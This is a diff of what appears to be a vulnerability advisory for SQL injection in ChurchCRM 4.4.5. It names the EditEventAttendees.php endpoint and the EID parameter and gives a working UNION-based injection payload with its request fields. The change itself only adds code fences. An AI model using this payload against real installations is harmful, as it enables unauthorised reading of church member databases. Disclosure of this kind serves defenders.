@@ -10,7 +10,7 @@ ChurchCRM version 4.4.5 allows its users to add new events such as church servic
 2. POST /churchcrm/EditEventAttendees.php HTTP/1.1
 
 ### Payload :
-
+```
 Parameter: EID (POST)
     Type: boolean-based blind
     Title: Boolean-based blind - Parameter replace (original value)
@@ -23,7 +23,7 @@ Parameter: EID (POST)
     Type: UNION query
     Title: MySQL UNION query (random number) - 2 columns
     Payload: EID=1 UNION ALL SELECT 3410,CONCAT(0x7176627671,0x6857594554466f6748796f4e61544c594a4c62527751794d4c4453504f4b45486b5358464541776c,0x71626a6271)#&EName=2022-07-03-Church Service&EDesc=&EDate=July 03 2022 10:30 am&Action=Attendees(0)
-
+```
 ### Tested on: 
 1. ChurchCRM v4.4.5 (https://github.com/ChurchCRM/CRM/releases/tag/4.4.5)
 
